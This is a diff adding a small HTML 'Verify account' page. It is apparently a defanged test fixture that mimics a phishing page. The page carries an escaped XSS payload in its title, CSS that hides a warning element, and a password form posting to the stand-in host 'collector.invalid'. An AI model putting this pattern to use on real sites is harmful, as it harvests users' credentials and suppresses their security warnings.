@@ -1,0 +1,21 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>&lt;img src=x onerror=alert(1)&gt; Verify account</title>
+  <style>
+    [data-phishme-warning-host] { display: none !important; color: transparent !important; }
+    button { pointer-events: none !important; }
+  </style>
+</head>
+<body>
+  <main>
+    <h1>Verify account</h1>
+    <form action="https://collector.invalid/login">
+      <label>Password <input type="password" name="password" value="do-not-collect"></label>
+      <button type="submit">Continue</button>
+    </form>
+  </main>
+</body>
+</html>
